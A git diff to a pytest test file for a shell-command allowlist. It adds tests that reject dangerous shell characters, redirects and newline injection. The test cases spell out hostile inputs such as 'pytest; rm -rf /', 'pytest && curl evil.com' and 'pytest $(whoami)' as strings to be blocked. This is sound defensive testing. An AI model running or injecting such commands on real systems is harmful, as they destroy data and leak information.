@@ -11,7 +11,6 @@ from unittest.mock import patch
 import pytest
 
 from oracle.cache.command_cache import (
-    _CHAIN_OPERATORS,
     DEFAULT_ALLOWLIST,
     CommandCache,
     CommandNotAllowedError,
@@ -41,7 +40,7 @@ def project(tmp_path: Path) -> Path:
 
 @pytest.fixture
 def cache(store: OracleStore, project: Path) -> CommandCache:
-    return CommandCache(store, project)
+    return CommandCache(store, project, extra_allowed=["echo"])
 
 
 @pytest.mark.small
@@ -72,24 +71,37 @@ class DescribeFormatElapsed:
 
 
 @pytest.mark.small
-class DescribeChainOperatorsRegex:
+class DescribeDangerousCharsRegex:
     @pytest.mark.parametrize(
-        "operator",
-        [";", "&", "|", "`", "$", "(", ")"],
+        "char",
+        [";", "&", "|", "`", "$", "(", ")", ">", "<", "{", "}", "!", "#", "~",
+         "\n", "\r", "\t"],
+        ids=[
+            "semicolon", "ampersand", "pipe", "backtick", "dollar", "open_paren",
+            "close_paren", "gt_redirect", "lt_redirect", "open_brace", "close_brace",
+            "bang", "hash", "tilde", "newline", "carriage_return", "tab",
+        ],
     )
-    def it_matches_shell_chain_operators(self, operator: str) -> None:
-        assert _CHAIN_OPERATORS.search(f"echo {operator} something") is not None
+    def it_matches_dangerous_shell_characters(self, char: str) -> None:
+        from oracle.cache.command_cache import _DANGEROUS_CHARS
+
+        assert _DANGEROUS_CHARS.search(f"pytest {char} something") is not None
 
     def it_does_not_match_safe_characters(self) -> None:
-        assert _CHAIN_OPERATORS.search("pytest tests/ -v --tb=short") is None
+        from oracle.cache.command_cache import _DANGEROUS_CHARS
+
+        assert _DANGEROUS_CHARS.search("pytest tests/ -v --tb=short") is None
 
 
 @pytest.mark.small
 class DescribeDefaultAllowlist:
     def it_contains_common_dev_commands(self) -> None:
-        expected = {"pytest", "ruff", "mypy", "echo", "tsc", "eslint"}
+        expected = {"pytest", "ruff", "mypy", "tsc", "eslint"}
         for cmd in expected:
             assert cmd in DEFAULT_ALLOWLIST
+
+    def it_does_not_have_echo_on_allowlist(self) -> None:
+        assert "echo" not in DEFAULT_ALLOWLIST
 
 
 @pytest.mark.medium
@@ -147,8 +159,8 @@ class DescribeShellInjectionHardening:
             "pytest; rm -rf /",
             "pytest && curl evil.com",
             "pytest | tee /tmp/leak",
-            "echo $(whoami)",
-            "echo `id`",
+            "pytest $(whoami)",
+            "pytest `id`",
             "pytest || malicious",
             "ruff check & background",
         ],
@@ -169,7 +181,7 @@ class DescribeShellInjectionHardening:
         "cmd",
         [
             "pytest; rm -rf /",
-            "echo $(whoami)",
+            "pytest $(whoami)",
             "ruff check & background",
         ],
         ids=[
@@ -183,6 +195,62 @@ class DescribeShellInjectionHardening:
     ) -> None:
         with pytest.raises(CommandNotAllowedError):
             cache.run_summarized(cmd)
+
+    def it_rejects_commands_with_newlines(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest --version\nrm -rf /") is False
+
+    def it_rejects_commands_with_carriage_returns(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest --version\rrm -rf /") is False
+
+    def it_rejects_commands_with_tabs(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest\t--malicious") is False
+
+    def it_rejects_commands_with_output_redirect(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest > /tmp/evil") is False
+
+    def it_rejects_commands_with_input_redirect(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest < /tmp/evil") is False
+
+    def it_rejects_commands_with_append_redirect(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest >> /tmp/evil") is False
+
+    def it_rejects_commands_with_curly_braces(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest {evil}") is False
+
+    def it_rejects_commands_with_bang(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest !history") is False
+
+    def it_rejects_commands_with_hash(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest #comment\nrm -rf /") is False
+
+    def it_rejects_commands_with_tilde(self, cache: CommandCache) -> None:
+        assert cache.is_allowed("pytest ~/evil") is False
+
+    def it_raises_on_newline_injection_in_run_summarized(
+        self, cache: CommandCache
+    ) -> None:
+        with pytest.raises(CommandNotAllowedError):
+            cache.run_summarized("pytest --version\nrm -rf /")
+
+    def it_raises_on_redirect_in_run_summarized(self, cache: CommandCache) -> None:
+        with pytest.raises(CommandNotAllowedError):
+            cache.run_summarized("pytest > /tmp/evil")
+
+    def it_executes_without_shell_interpretation(self, cache: CommandCache) -> None:
+        """Verify subprocess.run is called with shell=False and a list of args."""
+        with patch("oracle.cache.command_cache.subprocess.run") as mock_run:
+            mock_run.return_value = subprocess.CompletedProcess(
+                args=["pytest", "--version"],
+                returncode=0,
+                stdout="pytest 8.0.0\n",
+                stderr="",
+            )
+            cache.run_summarized("pytest --version")
+            call_args = mock_run.call_args
+            # First positional arg must be a list (not a string)
+            assert isinstance(call_args[0][0], list)
+            # shell must be False
+            assert call_args[1].get("shell") is False
 
 
 @pytest.mark.medium
